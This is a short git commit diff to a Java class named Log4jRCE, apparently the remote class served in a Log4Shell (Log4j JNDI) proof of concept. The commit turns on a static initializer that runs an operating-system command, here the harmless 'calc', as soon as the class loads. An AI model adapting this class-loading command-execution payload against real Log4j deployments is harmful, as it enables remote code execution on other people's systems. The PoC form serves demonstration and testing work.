e00ed28ca5e2f56b256892e1533471878ffa91f4
邱滔 <tao.qiu01@hand-china.com>
2021-12-10 16:08:03 +0800

    add

--- src/main/java/Log4jRCE.java
+++ src/main/java/Log4jRCE.java
@@ -2,12 +2,12 @@ public class Log4jRCE {
 
     static {
         System.out.println("I am Log4jRCE from remote!!!");
-//        try {
-//            String[] cmd = {"code"};
-//            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-//        } catch (Exception e) {
-//            e.printStackTrace();
-//        }
+       try {
+           String[] cmd = {"calc"};
+           Runtime.getRuntime().exec(cmd).waitFor();
+       } catch (Exception e) {
+           e.printStackTrace();
+       }
     }
 
     public Log4jRCE(){
